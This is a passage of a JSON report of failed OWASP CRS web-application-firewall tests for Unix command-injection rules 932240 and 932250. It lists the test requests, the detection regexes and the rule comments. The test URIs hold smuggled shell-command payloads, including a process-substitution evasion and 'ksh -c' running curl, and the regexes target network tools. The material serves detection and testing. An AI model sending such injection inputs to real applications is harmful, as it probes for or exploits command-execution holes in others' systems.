        "pattern" : "(?i)[\\-0-9_a-z]+(?:[\\s\\x0b]*[\\\"'][^\\s\\x0b\\\"',:]+[\\\"']|(?:[\\\"'][\\\"']+|[\\[-\\]]+|\\$+[!#\\*\\-0-9\\?@\\x5c_a-\\{]+|``|[\\$<>]\\(\\))[\\s\\x0b]*)[\\-0-9_a-z]+"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932240
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Unix Command Injection evasion attempt detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{TX.932240_MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-unix"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.932240_matched_var_name=%{matched_var_name}"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "932240",
    "test_id" : 15,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932240.yaml",
    "description" : "Process subtition '>()' WAF evasion (mid command)",
    "cause" : "failed expect_id check: 932240 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 15,
      "desc" : "Process subtition '>()' WAF evasion (mid command)",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "uri" : "/get?x=pi>()ng%20127.0.0.1",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932240 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932240,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " -=[ Rule 932240 ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Generic RCE Bypass blocking using different techniques: see https://github.com/coreruleset/coreruleset/issues/2632"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule complements rule 932230 with generic evasion detection."
        }, {
          "type" : "Comment",
          "text" : " Anything that uses a well-known evasion technique should be blocked at this level."
        }, {
          "type" : "Comment",
          "text" : " The chained rule will exclude false positives due to german thousands separators (e.g., 10'000)."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule relations:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932230 (base rule, PL1, targets prefix + two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  ..932231 (stricter sibling, PL2, targets prefix + the source shortcut command)"
        }, {
          "type" : "Comment",
          "text" : "  ..932232 (stricter sibling, PL3, targets prefix + additional command words)"
        }, {
          "type" : "Comment",
          "text" : "  .932235 (base rule, PL1, targets prefix + known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932250 (base rule, PL1, targets two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  .932260 (base rule, PL1, targets known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932240 (generic detection, PL2, targets generic evasion attempts)"
        }, {
          "type" : "Comment",
          "text" : "  .932236 (stricter sibling of 932230, 932235, 932250, 932260, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length)"
        }, {
          "type" : "Comment",
          "text" : "  ..932239 (sibling of 932236, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : "  ..932238 (stricter sibling of 932236, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - no excluded words)"
        }, {
          "type" : "Comment",
          "text" : "  .932237 (stricter sibling of 932230, 932235, 932250, 932260, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - with word boundaries"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932240.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932240"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)[\\-0-9_a-z]+(?:[\\s\\x0b]*[\\\"'][^\\s\\x0b\\\"',:]+[\\\"']|(?:[\\\"'][\\\"']+|[\\[-\\]]+|\\$+[!#\\*\\-0-9\\?@\\x5c_a-\\{]+|``|[\\$<>]\\(\\))[\\s\\x0b]*)[\\-0-9_a-z]+"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932240
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Unix Command Injection evasion attempt detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{TX.932240_MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-unix"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.932240_matched_var_name=%{matched_var_name}"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "932250",
    "test_id" : 5,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932250.yaml",
    "description" : "Positive test: Unix Command Injection - ksh test",
    "cause" : "failed expect_id check: 932250 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 5,
      "desc" : "Positive test: Unix Command Injection - ksh test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?code=ksh%20-c%20\"curl%20google.\"COM",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932250 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932250,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Unix direct remote command execution ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Detects Unix commands at the start of a parameter (direct RCE)."
        }, {
          "type" : "Comment",
          "text" : " Example: foo=wget%20www.example.com"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " In this rule we use a different check from command injection (rule 932230), where a"
        }, {
          "type" : "Comment",
          "text" : " command string is appended (injected) to a regular parameter, and then"
        }, {
          "type" : "Comment",
          "text" : " passed to a shell unescaped."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Additionaly, we require a trailing space (denoting command parameters) or command"
        }, {
          "type" : "Comment",
          "text" : " separator character after the command."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule is also triggered by an Oracle WebLogic Remote Command Execution exploit:"
        }, {
          "type" : "Comment",
          "text" : " [ Oracle WebLogic vulnerability CVE-2017-10271 - Exploit tested: https://www.exploit-db.com/exploits/43458 ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " An effort was made to combat evasions by shell quoting (e.g. 'ls',"
        }, {
          "type" : "Comment",
          "text" : " 'l'\"s\", \\l\\s are all valid). ModSecurity has a t:cmdLine"
        }, {
          "type" : "Comment",
          "text" : " transformation built-in to deal with this, but unfortunately, it"
        }, {
          "type" : "Comment",
          "text" : " replaces ';' characters and lowercases the payload, which is less"
        }, {
          "type" : "Comment",
          "text" : " useful for this case. However, emulating the transformation makes"
        }, {
          "type" : "Comment",
          "text" : " the regexp more complex."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This is the base Rule to prevent Direct Unix Command Injection"
        }, {
          "type" : "Comment",
          "text" : " without prefix match."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule relations:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932230 (base rule, PL1, targets prefix + two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  ..932231 (stricter sibling, PL2, targets prefix + the source shortcut command)"
        }, {
          "type" : "Comment",
          "text" : "  ..932232 (stricter sibling, PL3, targets prefix + additional command words)"
        }, {
          "type" : "Comment",
          "text" : "  .932235 (base rule, PL1, targets prefix + known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932250 (base rule, PL1, targets two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  .932260 (base rule, PL1, targets known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932240 (generic detection, PL2, targets generic evasion attempts)"
        }, {
          "type" : "Comment",
          "text" : "  .932236 (stricter sibling of 932230, 932235, 932250, 932260, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length)"
        }, {
          "type" : "Comment",
          "text" : "  ..932239 (sibling of 932236, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : "  ..932238 (stricter sibling of 932236, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - no excluded words)"
        }, {
          "type" : "Comment",
          "text" : "  .932237 (stricter sibling of 932230, 932235, 932250, 932260, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - with word boundaries"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932250.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932250"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:^|b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?y[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?x|(?:c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d|e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?v|v[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?l)|w[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[\\s\\x0b&\\),<>\\|]|$).*|[ls][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?r[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e|n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?i[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:(?:[\\s\\x0b&\\),<>\\|]|$).*|o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t)|[\\n\\r;=`\\{]|\\|\\|?|&&?|\\$(?:\\(\\(?|[\\[\\{])|<(?:\\(|<<)|>\\(|\\([\\s\\x0b]*\\))[\\s\\x0b]*(?:[\\$\\{]|(?:[\\s\\x0b]*\\(|!)[\\s\\x0b]*|[0-9A-Z_a-z]+=(?:[^\\s\\x0b]*|\\$(?:.*|.*)|[<>].*|'[^']*'|\\\"[^\\\"]*\\\")[\\s\\x0b]+)*[\\s\\x0b]*[\\\"']*(?:[\\\"'-\\+\\--9\\?A-\\]_a-z\\|]+/)?[\\\"'\\x5c]*(?:(?:7[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?z[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[arx][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?)?|(?:b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?z[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?z|c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[89][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?9|m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h)|d[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?)?f|e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?v|q[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n|s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h)|f[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[dg]|m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t)|(?:h[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u|u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|i[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?r[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?b|j[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:j[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?s|q)|[kz][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h|m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?r|p[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:d[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?b|k[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?g|t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?x|x[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?z)|r[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t)|s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d|(?:s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{